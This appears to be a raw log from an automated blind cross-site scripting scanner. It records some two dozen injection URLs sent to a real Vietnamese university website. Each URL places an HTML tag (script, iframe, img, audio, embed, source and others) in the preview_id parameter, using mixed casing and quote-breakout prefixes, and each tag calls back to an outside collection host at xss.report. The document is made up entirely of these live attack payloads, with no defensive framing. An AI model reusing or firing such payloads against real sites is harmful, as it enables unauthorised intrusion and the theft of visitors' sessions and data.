+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%2F%3E%2520%3C%3CAUdIO+srC%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FAUdIO%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CIMg+hREf%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FIMg%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3Ca+HReF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2Fa%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CEmbEd+HrEF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FEmbEd%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%253e%253c%3CiframE+hrEF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FiframE%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CSoUrCe+srC%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FSoUrCe%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CiMg+HrEF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FiMg%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%27%3E%5C%22%3CemBed+SRc%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FemBed%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CAUdiO+SRC%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FAUdiO%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CiFRAME+HREF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FiFRAME%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CVIdeO+HrEf%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FVIdeO%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3E%22%3C%3CA+src%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FA%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3E%3C%3CimG+hRef%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FimG%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CIfRAme+SRc%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FIfRAme%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CsOurcE+HreF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FsOurcE%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%2520%22%3E%2520%3C%3CscRIpt+HReF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FscRIpt%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3E%22%3C%3CsoURCE+hREf%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FsoURCE%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=.%5C%3E%22%3C%2F.%3CAudio+hrEF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FAudio%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3E%3C%3Csource+HRef%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2Fsource%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CbODy+HRef%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FbODy%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CscriPt+hrEf%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FscriPt%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%27%3E%5C%22%3CSOuRCe+HreF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FSOuRCe%3E&preview_nonce=4c13429dd3&preview=true
